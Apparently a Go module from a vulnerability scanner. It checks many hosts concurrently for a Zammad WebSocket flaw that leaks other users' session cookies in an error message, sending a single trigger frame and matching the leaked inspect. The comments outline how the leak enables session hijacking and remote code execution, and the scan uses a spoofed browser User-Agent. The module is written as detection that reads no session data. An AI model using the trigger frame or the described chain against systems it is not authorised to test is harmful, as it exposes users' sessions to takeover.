package zammad

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// Native verifier for CVE-2026-102489 — Zammad WebSocket error-message
// session disclosure (horizon3ai disclosure; fixed 7.2.0).
//
// Zammad resolves WebSocket events on /ws by Ruby constant lookup: the frame
// {"event":"base"} resolves the valid constant Sessions::Event::Base, which
// has no run() method. The resulting NoMethodError message embeds the full
// receiver inspect — including @clients, a live map of every connected
// user's request context with their Cookie headers — which an unauthenticated
// attacker harvests to hijack an authenticated session (chaining to RCE via
// the package/template API).
//
// Detection here is BENIGN and needs no connected users: send the single
// {"event":"base"} frame and match the leaked receiver inspect
// (Sessions::Event::Base + @clients) in the error response. Patched 7.2.0
// answers with a generic "The event could not be processed." — verified
// live against Zammad GmbH's own support portal. No session data is read
// or used; a hit marks the disclosure primitive only.
//
// A cheap HTTP fingerprint gate ("zammad" on the homepage) keeps the corpus
// cost at one GET for non-Zammad hosts; the WebSocket dial runs only for
// Zammad candidates. (A nuclei websocket template for this CVE exists but
// the embedded nuclei engine silently skips websocket-protocol templates in
// the global runner — hence this native module.)

const (
	wsPath      = "/ws"
	probeFrame  = `{"event":"base"}`
	readTimeout = 5 * time.Second
)

// Result reports one probe outcome.
type Result struct {
	Host       string `json:"host"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence,omitempty"`
	Detail     string `json:"detail,omitempty"`
}

// Fingerprint reports whether a homepage body looks like Zammad.
func Fingerprint(body string) bool {
	return strings.Contains(strings.ToLower(body), "zammad")
}

// IsVulnerableError reports whether a WebSocket error frame carries the
// leaked receiver inspect (the unpatched NoMethodError output).
func IsVulnerableError(message string) bool {
	l := message
	return strings.Contains(l, "Sessions::Event::Base") && strings.Contains(l, "@clients")
}

// Probe dials wss://host/ws, sends the benign probe frame, and reads frames
// for a short window looking for the leaked inspect.
func Probe(ctx context.Context, host string, timeout time.Duration) Result {
	res := Result{Host: host}
	dialer := &websocket.Dialer{
		HandshakeTimeout: timeout,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
	}
	wsURL := strings.Replace(strings.TrimRight(host, "/"), "http://", "ws://", 1)
	wsURL = strings.Replace(wsURL, "https://", "wss://", 1) + wsPath

	dialCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	conn, _, err := dialer.DialContext(dialCtx, wsURL, http.Header{
		"Origin": {strings.Replace(strings.Replace(wsURL, "ws://", "http://", 1), "wss://", "https://", 1)},
	})
	if err != nil {
		res.Detail = fmt.Sprintf("ws dial failed: %.120v", err)
		return res
	}
	defer conn.Close()

	if err := conn.WriteControl(websocket.TextMessage, []byte(probeFrame), time.Now().Add(3*time.Second)); err != nil {
		_ = conn.WriteMessage(websocket.TextMessage, []byte(probeFrame))
	}

	deadline := time.Now().Add(readTimeout)
	_ = conn.SetReadDeadline(deadline)
	for time.Now().Before(deadline) {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		if IsVulnerableError(string(msg)) {
			res.Vulnerable = true
			// Evidence: the error class + @clients marker presence only —
			// never quote the leaked cookie material back.
			res.Evidence = "error frame leaks Sessions::Event::Base inspect with @clients map"
			return res
		}
		if strings.Contains(string(msg), "could not be processed") {
			res.Detail = "patched-style generic error frame (7.2.0+)"
			return res
		}
	}
	res.Detail = "no discriminating frame within window"
	return res
}

// Options tune a Run.
type Options struct {
	Concurrency int
	Timeout     time.Duration
}

// Run walks hosts: HTTP fingerprint gate, then the WebSocket probe for
// Zammad candidates. onHit fires for VULNERABLE results only.
func Run(ctx context.Context, hosts []string, opts Options, onHit func(Result)) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 20
	}
	if opts.Timeout <= 0 {
		opts.Timeout = 15 * time.Second
	}
	client := &http.Client{
		Timeout: opts.Timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:    100,
		},
	}
	sem := make(chan struct{}, opts.Concurrency)
	var wg sync.WaitGroup
	for _, host := range hosts {
		wg.Add(1)
		go func(h string) {
			defer wg.Done()
			select {
			case <-ctx.Done():
				return
			case sem <- struct{}{}:
			}
			defer func() { <-sem }()

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, strings.TrimRight(h, "/")+"/", nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			buf := make([]byte, 32*1024)
			n, _ := resp.Body.Read(buf)
			resp.Body.Close()
			if !Fingerprint(string(buf[:n])) {
				return
			}
			r := Probe(ctx, h, opts.Timeout)
			if r.Vulnerable && onHit != nil {
				onHit(r)
			}
		}(host)
	}
	wg.Wait()
}
